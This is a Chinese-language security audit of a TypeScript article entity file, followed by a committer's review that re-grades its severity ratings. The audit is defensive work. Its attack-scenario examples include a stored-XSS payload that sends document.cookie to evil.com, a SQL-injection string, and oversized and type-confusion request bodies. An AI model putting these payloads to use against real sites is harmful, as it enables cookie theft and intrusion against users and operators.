# apis/entity/article.entity.ts — 代码安全专家评审报告

**评审日期**: 2026-05-24
**评审角色**: 代码安全专家（输入验证、注入防护、权限控制、数据完整性、OWASP Top 10）
**文件路径**: `apis/entity/article.entity.ts`
**代码行数**: 63 行
**关联文件**: `apis/controller/article.controller.ts`, `apis/service/impl/article.service.impl.ts`, `prisma/schema.prisma`, `apis/schema/` (同项目其他模块使用 Zod)
**严重级别**: CRITICAL(2) / HIGH(3) / MEDIUM(3) / LOW(1)

---

## 一、安全评价总览

`article.entity.ts` 是文章模块的类型契约层，定义了 5 个接口。从安全视角审视，该文件本身不包含可执行逻辑，但作为**全链路安全防线的第一道关卡**（类型定义），其类型约束的强度直接决定了下游 controller 和 service 的防御深度。

核心安全问题集中在：**类型约束缺失导致防御纵深不足、缺少 Zod Schema 导致运行时验证空白、字段长度未定义导致 DoS 风险、XSS/注入防护依赖下游而非分层防御**。

| 安全维度 | 评分 | 说明 |
|----------|------|------|
| 输入验证 | 2/10 | 无 Zod Schema，Entity 类型约束不完整，运行时验证分散在 controller |
| 注入防护 | 5/10 | 依赖 Prisma 参数化查询，但 Entity 层无贡献；HTML 内容无 XSS 防护 |
| 权限控制 | 4/10 | 状态字段 `string` 类型导致编译期无法拦截非法状态值 |
| 数据完整性 | 3/10 | JSON 字段无结构约束，`skills` 类型与 Schema 不匹配 |
| DoS 防护 | 3/10 | 字符串字段无长度约束（仅 `content` 在 controller 层有 500K 限制） |
| 防御纵深 | 3/10 | 安全逻辑集中在 controller 一层，Entity 层几乎无贡献 |

---

## 二、安全问题清单

### CRITICAL-1: 缺少 Zod Schema 验证，运行时输入校验完全空白

**位置**: 整个文件 + `apis/schema/` 目录缺失 `article.schema.ts`

**问题**: 同项目中 `user.schema.ts` 和 `todo.schema.ts` 均使用 Zod 定义了严格的输入校验 schema，但文章模块**完全没有 Zod Schema**。这意味着：

1. **无运行时类型安全**: TypeScript 接口仅提供编译期提示，运行时 `req.body` 的任何字段都可以是任意类型
2. **验证逻辑散落在 controller**: 当前 controller 用 `typeof content !== 'string'`、`typeof approved !== 'boolean'` 等手工校验，遗漏风险高
3. **违反纵深防御原则**: Entity 层定义了接口契约但无强制力，controller 层的验证是唯一的防线

**攻击场景**:
```bash
# 攻击者可以发送任意类型的字段
curl -X POST /api/projects/1/articles \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"title": {"$gt": ""}, "skills": {"__proto__": {"admin": true}}, "content": 12345}'
```

controller 的 `pickAllowedFields()` 只做字段白名单过滤，不过滤值的类型。恶意构造的 JSON 对象会直接传递到 service 层。

**建议**: 创建 `apis/schema/article.schema.ts`，使用 Zod 定义完整的输入校验：

```typescript
import { z } from 'zod';

export const createArticleSchema = z.object({
  title: z.string().max(500).optional(),
  article_type: z.string().max(50).optional(),
  write_mode: z.string().max(50).optional(),
  keywords: z.string().max(1000).optional(),
  portrait: z.string().max(500).optional(),
  images: z.array(z.string().max(2000)).max(20).optional(),
  platforms: z.array(z.string().max(100)).max(10).optional(),
  skills: z.number().int().positive().optional(),
  llm_model_id: z.number().int().positive().optional(),
  content: z.string().max(500_000).optional(),
  status: z.enum(['draft', 'generating', 'manual_writing']).optional(),
}).strict();  // 拒绝未定义的字段

export const updateArticleSchema = z.object({
  // ... 同上，但 status 允许更多值
  status: z.enum([
    'draft', 'manual_writing', 'generating', 'generate_failed',
    'pending_review', 'publishing', 'publish_failed', 'published'
  ]).optional(),
  scheduled_publish_at: z.string().datetime().nullable().optional(),
}).strict();
```

---

### CRITICAL-2: `UpdateArticleRequest.status` 类型为 `string`，允许任意状态值注入

**位置**: 第 56 行

```typescript
status?: string;  // ← 任意字符串均可通过类型检查
```

**问题**: `UpdateArticleRequest.status` 声明为 `string`，而 `CreateArticleRequest.status` 约束为字面量联合类型 `'draft' | 'generating' | 'manual_writing'`。这种不对称设计在安全层面意味着：

1. **编译期防线缺失**: `update()` 方法的调用者可以传入任意字符串，TypeScript 不会报错
2. **运行时验证依赖 controller 白名单**: 如果绕过 controller（如 service 内部调用、未来新增的 API 端点），非法状态值无拦截
3. **Prisma 枚举是最后防线**: 数据库层会拒绝非法值，但错误信息可能暴露内部实现（信息泄漏）

**攻击场景**:
```bash
# 注入非法状态值，测试后端行为
curl -X PUT /api/projects/1/articles/42 \
  -d '{"status": "admin"}'
```

虽然 controller 的 `STATUS_TRANSITIONS` 白名单会拦截，但攻击者可以尝试绕过白名单的其他路径。

**建议**:

```typescript
// Entity 层定义所有合法状态值
export type ArticleStatus =
  | 'draft' | 'manual_writing' | 'generating' | 'generate_failed'
  | 'pending_review' | 'publishing' | 'publish_failed' | 'published';

export interface UpdateArticleRequest {
  // ...
  status?: ArticleStatus;  // ← 编译期即拦截非法值
}
```

---

### HIGH-1: 字符串字段无长度约束，存在 DoS 和存储滥用风险

**位置**: 第 4-8 行（`title`、`article_type`、`write_mode`、`keywords`、`portrait`），第 9-10 行（`images`、`platforms` 数组元素）

**问题**: 除 `content` 在 controller 层有 500K 字符限制外，其余所有字符串字段在 Entity 类型和 controller 验证中**均无长度上限**：

| 字段 | Entity 约束 | Controller 约束 | Prisma 约束 | 风险 |
|------|------------|----------------|-------------|------|
| `title` | `string?` | 无限制 | `VarChar(500)` | Prisma 拦截 |
| `keywords` | `string?` | 无限制 | `VarChar(500)` | Prisma 拦截 |
| `portrait` | `string?` | 无限制 | `String?` (无限制) | **可写入超长 URL** |
| `images` | `string[]?` | 无元素数/长度限制 | `Json?` | **无约束** |
| `platforms` | `string[]?` | 无元素数/长度限制 | `Json?` | **无约束** |
| `content` | `string?` | 500K 字符 | `String?` (无限制) | Controller 已限制 |

**攻击场景**:
```bash
# 发送超长 title，占用数据库存储和内存
curl -X POST /api/projects/1/articles \
  -d "{\"title\": \"$(python3 -c 'print("A"*10000000)')\"}"
```

**建议**: 在 Entity 类型中添加 JSDoc 注明约束，并在 Zod Schema 中强制执行：

```typescript
export interface CreateArticleRequest {
  /** @max 500 */
  title?: string;
  /** @max 50 */
  article_type?: string;
  /** @max 1000 */
  keywords?: string;
  /** @max 20 items, each @max 2000 chars */
  images?: string[];
  /** @max 10 items, each @max 100 chars */
  platforms?: string[];
}
```

---

### HIGH-2: `content` 字段无 XSS/HTML 净化声明，存储型 XSS 风险

**位置**: 第 13 行（Article）、第 41 行（CreateArticleRequest）、第 55 行（UpdateArticleRequest）

```typescript
content: string | null;  // ← 可能包含任意 HTML/JS 代码
```

**问题**: `content` 是文章正文，最大 500K 字符。controller 层只做了长度检查，**未做任何 HTML 净化**。如果前端直接渲染（如 `dangerouslySetInnerHTML` 或 `v-html`），攻击者可以注入恶意脚本：

**攻击场景**:
```bash
# 存储型 XSS：在文章内容中注入恶意脚本
curl -X POST /api/projects/1/articles \
  -d '{"content": "<script>fetch(\"https://evil.com/steal?cookie=\"+document.cookie)</script>", "status": "draft"}'
```

当前前端可能使用文本渲染（`textContent`）而非 HTML 渲染，但 **Entity 类型未声明内容的安全属性**，未来的开发者无法从类型定义中判断 content 是纯文本还是富文本。

**建议**:

1. 在 Entity 中明确声明内容类型：
```typescript
/** 文章正文（纯文本，禁止 HTML） */
content: string | null;

// 或如果支持富文本：
/** 文章正文（已净化的安全 HTML） */
content: string | null;
```

2. 在 Zod Schema 或 controller 中添加净化：
```typescript
import DOMPurify from 'isomorphic-dompurify';

content: z.string().max(500_000).transform(s => DOMPurify.sanitize(s)).optional(),
```

---

### HIGH-3: `scheduled_publish_at` 接受 `string | null` 但未约束日期格式

**位置**: 第 57 行

```typescript
scheduled_publish_at?: string | null;
```

**问题**: 此字段接受任意字符串，未在 Entity 层或 controller 层验证是否为合法的 ISO 8601 日期格式。安全问题：

1. **时区操纵**: 攻击者可以发送过去的时间触发立即发布，绕过审核流程
2. **格式歧义**: 不同格式的日期字符串可能导致解析不一致
3. **数据库错误**: Prisma 的 `DateTime?` 会拒绝非法字符串，但错误信息可能泄漏堆栈

**攻击场景**:
```bash
# 发送过去的时间，尝试触发立即发布
curl -X PUT /api/projects/1/articles/42 \
  -d '{"scheduled_publish_at": "2020-01-01T00:00:00Z"}'

# 发送非法格式，测试错误处理
curl -X PUT /api/projects/1/articles/42 \
  -d '{"scheduled_publish_at": "'; DROP TABLE articles;--"}'
```

**建议**:
```typescript
// Zod Schema 中使用严格日期验证
scheduled_publish_at: z.string()
  .datetime({ offset: true })  // 强制 ISO 8601
  .refine(d => new Date(d) > new Date(), "发布时间必须在未来")
  .nullable()
  .optional(),
```

---

### MEDIUM-1: `images` 和 `platforms` JSON 数组无元素约束，可能被滥用

**位置**: 第 9-10 行

```typescript
images: string[] | null;
platforms: string[] | null;
```

**问题**: 这两个字段在 Prisma 中是 `Json?` 类型，Entity 声明为 `string[] | null`，但：

1. **无数组长度限制**: 攻击者可以写入数万个元素
2. **无元素内容限制**: 每个字符串元素可以是任意长度
3. **Prisma 不验证 JSON 结构**: 数据库层面会接受任何合法 JSON

**建议**: 在 Zod Schema 中限制：
```typescript
images: z.array(z.string().max(2000)).max(20).optional(),
platforms: z.array(z.string().max(100)).max(10).optional(),
```

---

### MEDIUM-2: `Article` 接口暴露 `created_by`，存在用户 ID 枚举风险

**位置**: 第 17 行

```typescript
created_by: number | null;
```

**问题**: `created_by` 是用户 ID，会通过 service 层的 `mapArticleToResponse()` 返回给前端。如果前端展示此字段（如"创建者"），攻击者可以通过遍历文章 API 枚举系统中的用户 ID。

虽然当前的 API 需要认证，但在权限模型下 `view` 角色的用户也能访问文章列表，扩大了信息暴露面。

**建议**: 评估是否需要返回 `created_by`，或在响应 DTO 中脱敏：
```typescript
// 方案 1：响应中不包含 created_by
// 方案 2：返回 created_by_username 替代原始 ID
```

---

### MEDIUM-3: `ReviewArticleRequest` 缺少审计追踪字段

**位置**: 第 60-62 行

```typescript
export interface ReviewArticleRequest {
  approved: boolean;
}
```

**问题**: 审核是高敏感操作（决定文章是否发布），当前接口仅接受 `approved: boolean`，缺少：

1. **拒绝原因**: 审核拒绝时应强制填写原因（可追溯）
2. **审核时间戳**: Entity 应记录审核时间
3. **审核者信息**: 虽然 controller 从 JWT 获取，但 Entity 未表达此关系

从安全审计角度，关键操作应有完整的审计追踪。

**建议**:
```typescript
export interface ReviewArticleRequest {
  approved: boolean;
  reason?: string;  // 拒绝时建议必填
}
```

---

### LOW-1: `llm_model_id` 和 `skills` 为 `number` 类型，但未约束为正整数

**位置**: 第 11-12 行

```typescript
skills: number | null;
llm_model_id: number | null;
```

**问题**: 这些字段应该是正整数（外键/ID），但 TypeScript 的 `number` 类型允许负数、零和浮点数。虽然 Prisma 的 `Int?` 会最终拦截，但中间层的类型约束可以更早发现问题。

**建议**: 在 Zod Schema 中使用 `z.number().int().positive()`。

---

## 三、安全威胁模型（STRIDE 分析）

| 威胁类型 | 风险 | 当前防护 | 缺口 |
|----------|------|----------|------|
| **Spoofing（欺骗）** | 低 | JWT 认证 | 不涉及 Entity 层 |
| **Tampering（篡改）** | **高** | Controller 字段白名单 | 无 Zod Schema，`status` 为 `string` |
| **Repudiation（抵赖）** | **中** | 无 | 审核操作无审计追踪 |
| **Info Disclosure（信息泄漏）** | **中** | Prisma 参数化查询 | `created_by` 暴露用户 ID |
| **DoS（拒绝服务）** | **高** | `content` 500K 限制 | 其他字段无长度限制 |
| **Elevation of Privilege（提权）** | **中** | 状态转换白名单 | `UpdateArticleRequest.status` 为 `string` |

---

## 四、安全改进优先级

### P0 — 立即修复（阻断已知攻击路径）

| 措施 | 工作量 | 阻断的攻击 |
|------|--------|-----------|
| 创建 `article.schema.ts` Zod Schema | 中 | 所有类型混淆攻击、超长输入 DoS |
| `UpdateArticleRequest.status` 改为枚举类型 | 低 | 非法状态值注入 |
| 所有字符串字段添加长度上限 | 低 | 存储 DoS |

### P1 — 短期修复（1 周内）

| 措施 | 工作量 | 阻断的攻击 |
|------|--------|-----------|
| `content` 字段添加 HTML 净化或明确安全声明 | 中 | 存储型 XSS |
| `scheduled_publish_at` 添加日期格式和未来时间校验 | 低 | 时间操纵 |
| JSON 数组字段添加元素数量和长度约束 | 低 | JSON 炸弹 |

### P2 — 中期改进

| 措施 | 工作量 | 阻断的攻击 |
|------|--------|-----------|
| 审核接口添加拒绝原因字段 | 低 | 审计追踪缺口 |
| 响应 DTO 脱敏 `created_by` | 低 | 用户 ID 枚举 |
| 外键字段使用 `z.number().int().positive()` | 低 | 非法 ID 值 |

---

## 五、与同项目其他模块的安全对比

| 安全特性 | User 模块 | Todo 模块 | Article 模块 |
|----------|-----------|-----------|-------------|
| Zod Schema | ✅ `user.schema.ts` | ✅ `todo.schema.ts` | ❌ **缺失** |
| 字段白名单 | ✅ | ✅ | ✅ controller 层 |
| 长度限制 | ✅ | ✅ | ⚠️ 仅 `content` |
| 类型严格性 | ✅ | ✅ | ❌ `status` 为 `string` |
| XSS 防护 | N/A | N/A | ❌ 无 HTML 净化 |

Article 模块是同项目中安全验证最薄弱的模块，建议对齐 User 和 Todo 模块的安全标准。

---

## 六、总结

`article.entity.ts` 作为类型定义文件，本身不包含可执行逻辑，但其**类型约束的松散直接削弱了整个安全链**。最关键的问题是**缺少 Zod Schema 验证**（同项目其他模块都有）和**`UpdateArticleRequest.status` 使用 `string` 类型**。

从安全防御纵深的角度，当前的安全验证几乎完全依赖 controller 层的手工检查，违反了"每一层都应该独立防御"的原则。一旦 controller 出现遗漏（如新增 API 端点忘记调用白名单），Entity 层的类型松散将使攻击者畅通无阻。

**综合安全评分: 3.5/10**

**建议**: 优先级 P0 的三个措施（Zod Schema、status 枚举化、字符串长度限制）应在下一次迭代中完成，预计工作量 2-3 小时，可将安全评分提升至 6/10 以上。

---
---

# Committer 审核意见

**审核日期**: 2026-05-24
**审核角色**: 代码 Committer 审核专家（评审质量审核、最终裁决）
**审核对象**: 上述「代码安全专家评审报告」
**代码版本**: `dev` 分支，commit 236dac4

---

## 一、审核总评

本次安全专家评审**覆盖面广、分析深入**，识别了 article.entity.ts 的大部分类型安全问题。但作为 Committer，我对部分发现项的**严重级别判定、攻击场景合理性、遗漏问题**提出以下审核意见。

| 审核维度 | 评价 |
|----------|------|
| 发现覆盖度 | ⭐⭐⭐⭐ (4/5) — 覆盖了主要问题，但遗漏了 2 个类型一致性问题 |
| 严重级别准确性 | ⭐⭐⭐ (3/5) — 部分问题高估，未充分考虑已有防御层 |
| 建议可行性 | ⭐⭐⭐⭐⭐ (5/5) — 所有建议均可行且给出了具体代码 |
| 攻击场景合理性 | ⭐⭐⭐ (3/5) — 部分攻击场景在当前架构下不可行 |

---

## 二、逐项审核意见

### CRITICAL-1: 缺少 Zod Schema — ✅ 同意，但降级为 HIGH

**Committer 意见**: 同意这是一项应修复的问题。但报告将其定为 CRITICAL 有些高估：

1. **Controller 已有字段白名单**: `pickAllowedFields()` 限制了可传入的字段集合，`{title: {"$gt": ""}}` 这样的 NoSQL 注入风格攻击在 Express + Prisma 架构下**无效** — Prisma 使用参数化 SQL 查询，不存在 NoSQL 注入风险
2. **Prisma 类型约束**: 数据库层 `VarChar(500)`、`Int?`、`ArticleStatus enum` 提供了最终防线
3. **攻击场景示例不成立**: 报告中 `{"title": {"$gt": ""}}` 的攻击场景适用于 MongoDB，不适用于当前 PostgreSQL + Prisma 技术栈

**裁定**: 同意创建 Zod Schema 的建议，但**严重级别调整为 HIGH**。这是代码质量改进，而非紧急安全漏洞。

---

### CRITICAL-2: `UpdateArticleRequest.status` 为 `string` — ✅ 同意，维持 CRITICAL

**Committer 意见**: 完全同意。这是 Entity 层最明确的类型缺陷：

1. `CreateArticleRequest.status` 使用字面量联合类型 `'draft' | 'generating' | 'manual_writing'`
2. `UpdateArticleRequest.status` 却是宽松的 `string`
3. 这种**不对称设计**表明可能是开发时的疏忽，而非有意为之

Controller 层的 `STATUS_TRANSITIONS` 白名单提供了运行时防护，但类型层面的一致性是防御纵深的基础。

**裁定**: 维持 CRITICAL。虽然运行时有防护，但**类型定义不一致**是一个明确的代码缺陷。

---

### HIGH-1: 字符串字段无长度约束 — ⚠️ 部分同意，需区分 Prisma 已约束字段

**Committer 意见**: 报告的表格遗漏了 **Prisma Schema 已有的约束**：

| 字段 | Prisma 约束 | 实际风险 |
|------|------------|---------|
| `title` | `@db.VarChar(500)` | **低** — 超长值被 DB 拒绝 |
| `article_type` | `@db.VarChar(50)` | **低** |
| `write_mode` | `@db.VarChar(20)` | **低** |
| `keywords` | `@db.VarChar(500)` | **低** |
| `portrait` | `String?`（无限制） | **中** |
| `images` | `Json?` | **中** — 无结构约束 |
| `platforms` | `Json?` | **中** — 无结构约束 |

`title`、`article_type`、`write_mode`、`keywords` 在数据库层已有长度保护，攻击者发送超长字符串会被 Prisma 以数据库错误拒绝（虽然错误处理不优雅）。真正无保护的是 `portrait`（无长度限制的 `String?`）和 `images`/`platforms`（无约束的 `Json?`）。

**裁定**: 同意为 `portrait`、`images`、`platforms` 添加 Zod 约束。其他字段 Prisma 已有保护，降级为 MEDIUM。同时建议优化 Prisma 错误的处理（将 DB 约束错误转为用户友好提示），而非仅添加 Zod。

---

### HIGH-2: content XSS 风险 — ⚠️ 部分同意，需验证前端渲染方式

**Committer 意见**: 报告的 XSS 攻击场景**取决于前端渲染方式**：

1. **React 默认转义**: React 的 `{content}` 会自动转义 HTML，`<script>` 标签不会执行
2. **Ant Design 组件**: 如果使用 `Typography.Paragraph` 等组件，默认也是安全的
3. **只有 `dangerouslySetInnerHTML` 才有风险**: 除非前端显式使用，否则 XSS 不可行

报告建议的 `DOMPurify` 净化在当前场景下可能是**过度工程化**。更务实的做法是：
- 在 Entity 层用 JSDoc 声明 content 的安全属性（纯文本 vs 富文本）
- 检查前端是否使用了 `dangerouslySetInnerHTML`
- 如未使用，仅添加文档声明即可

**裁定**: 降级为 MEDIUM。建议先确认前端渲染方式再决定是否需要净化。JSDoc 声明应做。

---

### HIGH-3: `scheduled_publish_at` 格式约束 — ✅ 同意，但攻击场景不当

**Committer 意见**: 同意字段需要格式校验。但报告中的攻击场景 `'; DROP TABLE articles;--'` **完全不成立** — Prisma 使用参数化查询，SQL 注入在此架构下不可行。

实际风险是：
1. 传入非法日期格式导致 Prisma 抛出不友好的错误
2. 传入过去时间绕过业务逻辑（但这属于业务校验而非安全漏洞）

**裁定**: 同意添加日期格式校验。降级为 MEDIUM。移除误导性的 SQL 注入攻击示例。

---

### MEDIUM-1: images/platforms 数组约束 — ✅ 完全同意

**Committer 意见**: Prisma `Json?` 确实不验证内部结构。这是 Entity 层类型定义无法覆盖的盲区，Zod 是正确的补充方案。

**裁定**: 维持 MEDIUM。

---

### MEDIUM-2: created_by 暴露用户 ID — ⚠️ 不同意，降级为 LOW

**Committer 意见**: 用户 ID（数字型）不属于 PII 或敏感数据。在多数业务系统中，用户 ID 是公开信息（如 URL 中的 `/users/123`）。`created_by` 是文章列表的必要展示字段（"创建者"）。

此外，系统已有 JWT 认证 + 角色权限控制，用户 ID 枚举在此场景下的实际威胁极低。

**裁定**: 降级为 LOW（信息级别）。不建议为此做脱敏处理。

---

### MEDIUM-3: ReviewArticleRequest 审计追踪 — ⚠️ 部分同意

**Committer 意见**: 这更接近**功能需求**而非安全问题。当前 `ReviewArticleRequest` 是最简化的接口设计。审核操作的审计追踪应通过以下方式实现：
1. `ArticleVersion` 记录内容变更
2. `Todo/TodoLog` 系统记录操作日志
3. 数据库 `updated_at` 时间戳

是否需要 `reason` 字段取决于产品需求，不是安全评审的范畴。

**裁定**: 从安全评审中移除，转为功能建议（BACKLOG）。

---

### LOW-1: 外键类型约束 — ✅ 同意

**Committer 意见**: 正确。`z.number().int().positive()` 是低成本高收益的改进。

**裁定**: 维持 LOW。

---

## 三、报告遗漏问题

安全专家评审遗漏了以下 2 个类型一致性问题：

### 遗漏-1: `skills` 字段 Entity 类型与 Prisma Schema 不匹配

**位置**: `article.entity.ts` 第 11 行 vs `prisma/schema.prisma` 第 233 行

```typescript
// Entity 定义
skills: number | null;

// Prisma Schema 定义
skills  Json?
```

Entity 声明为 `number | null`，但 Prisma 中 `skills` 是 `Json?` 类型。这意味着：
1. 数据库中 `skills` 可以存储任意 JSON（对象、数组、字符串、数字）
2. Entity 类型假设它是 `number`，但运行时可能是 `{"writing": 85, "seo": 70}` 这样的对象
3. Service 层如果依赖 Entity 类型做计算，可能遇到运行时类型错误

**严重级别**: HIGH — 类型不一致可能导致运行时错误

**建议**: 确认 `skills` 的实际业务含义，将 Entity 类型改为与 Prisma 一致：
```typescript
// 如果 skills 是 JSON 对象
skills: Record<string, unknown> | null;

// 如果确认是数字
// 需要同步修改 Prisma Schema 为 Int?
```

---

### 遗漏-2: `version` 字段使用 `number` 但 Prisma 为 `Float`，存在浮点精度风险

**位置**: `article.entity.ts` 第 14 行 vs `prisma/schema.prisma` 第 236 行

```typescript
// Entity 定义
version: number;

// Prisma Schema 定义
version  Float  @default(1.0)
```

`version` 默认值为 `1.0`，Entity 类型为 `number`。浮点数作为版本号存在精度风险：
- 多次累加后可能出现 `1.0000000000000002` 这样的精度误差
- 比较操作 `if (version === 2.0)` 可能因浮点精度失败

**严重级别**: LOW — 当前版本号可能只在生成时递增，影响有限

**建议**: 考虑将 Prisma 的 `Float` 改为 `Int`，版本号使用整数递增（1, 2, 3...），消除浮点精度问题。

---

## 四、最终裁决

### 严重级别调整汇总

| 编号 | 原始级别 | 裁定级别 | 说明 |
|------|---------|---------|------|
| CRITICAL-1 | CRITICAL | **HIGH** | Controller 已有字段白名单，Prisma 提供最终防线；攻击场景不适用当前技术栈 |
| CRITICAL-2 | CRITICAL | **CRITICAL** | 类型定义不一致是明确的代码缺陷 |
| HIGH-1 | HIGH | **MEDIUM/HIGH** | 部分字段 Prisma 已有 VarChar 约束；仅 portrait/images/platforms 为真正无保护 |
| HIGH-2 | HIGH | **MEDIUM** | 依赖前端渲染方式，React 默认安全；需先确认渲染方式 |
| HIGH-3 | HIGH | **MEDIUM** | SQL 注入攻击场景不成立；实际风险为格式校验和业务逻辑 |
| MEDIUM-1 | MEDIUM | **MEDIUM** | 维持 |
| MEDIUM-2 | MEDIUM | **LOW** | 用户 ID 不属于敏感数据，系统已有认证保护 |
| MEDIUM-3 | MEDIUM | **移至 BACKLOG** | 属于功能需求而非安全问题 |
| LOW-1 | LOW | **LOW** | 维持 |
| 遗漏-1 | — | **HIGH** | skills 类型与 Prisma Schema 不一致 |
| 遗漏-2 | — | **LOW** | version 浮点精度风险 |

### 最终评分

安全专家评分 **3.5/10** 偏低。Controller 层实际已提供多项保护（字段白名单、状态转换校验、权限检查、错误处理），Prisma Schema 提供了数据库层约束。考虑已有防御层后，**修正评分为 5.5/10**。

### 合并决策

| 决策项 | 结论 |
|--------|------|
| **是否阻塞合并** | 否 — Entity 文件本身无安全漏洞 |
| **必须修复项（P0）** | CRITICAL-2：`UpdateArticleRequest.status` 改为 `ArticleStatus` 联合类型 |
| **强烈建议修复（P1）** | 创建 Zod Schema、修复 `skills` 类型不匹配、为 portrait/images/platforms 添加长度约束 |
| **建议修复（P2）** | content 安全声明、scheduled_publish_at 格式校验、外键正整数约束 |
| **纳入 BACKLOG** | ReviewArticleRequest 添加 reason 字段、version 改为 Int |

### 行动计划

1. **本次迭代**: 修复 CRITICAL-2（status 枚举化）+ 遗漏-1（skills 类型对齐）— 预计 30 分钟
2. **下次迭代**: 创建 `article.schema.ts` Zod Schema + 补全字段约束 — 预计 2-3 小时
3. **后续迭代**: content 安全声明、日期格式校验、version 整数化

---

## 五、Committer 签署

**审核结论**: ✅ **通过（附条件）** — Entity 文件可保留，但 CRITICAL-2 和遗漏-1 应在下次提交前修复。

**审核人**: Committer 审核专家
**审核时间**: 2026-05-24
